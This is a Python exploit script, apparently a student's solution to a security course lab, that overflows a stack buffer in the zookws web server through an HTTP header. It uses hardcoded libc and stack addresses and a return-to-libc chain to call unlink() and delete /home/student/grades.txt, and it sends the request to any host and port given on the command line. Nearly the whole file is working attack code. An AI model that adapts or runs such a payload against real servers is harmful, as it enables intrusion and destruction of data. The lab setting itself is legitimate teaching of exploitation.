#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

libc_base = 0x155554f3b000
stack_buffer = 0x7fffffffda90
stack_retaddr = 0x7fffffffdcc8
libc_retaddr = libc_base + 0x7b4e4 # change for stack aligned
filename_addr = 0x7fffffffdce0
rbp_shouldbe = filename_addr
system_addr = 0x155554f8a440
unlink_addr = 0x15555504cd40
exit_addr = 0x155554f7e120
rbp_pop = 0x7fffffffdcc0

def urlencode(b):
    r = b""
    for c in b:
        r += b"%"+c.to_bytes(1,"little").hex().encode()
    return r

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.parse.quote_from_bytesquote(s).encode('ascii')
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<Q", x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x
    filename = b"/home/student/grades.txt"+b"\0"

    req =   b"GET / HTTP/1.0\r\n" #+ \
            #b"\r\n"
    payload = b""
    req += b"EXP: "
    req += b"A" * ((stack_retaddr - stack_buffer) -16) #junk
    # req += b"//bin/sh" # string
    payload += struct.pack('<Q', filename_addr)
    payload += struct.pack('<Q', rbp_shouldbe)
    payload += struct.pack('<Q', libc_retaddr) # return adress
    payload += struct.pack('<Q', unlink_addr)
    payload += struct.pack('<Q', filename_addr)
    # payload += struct.pack('<Q', exit_addr)
    
    
    req += urlencode(payload)
    req += filename
    req += b"\r\n"
    req += b"\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp


if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    #print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

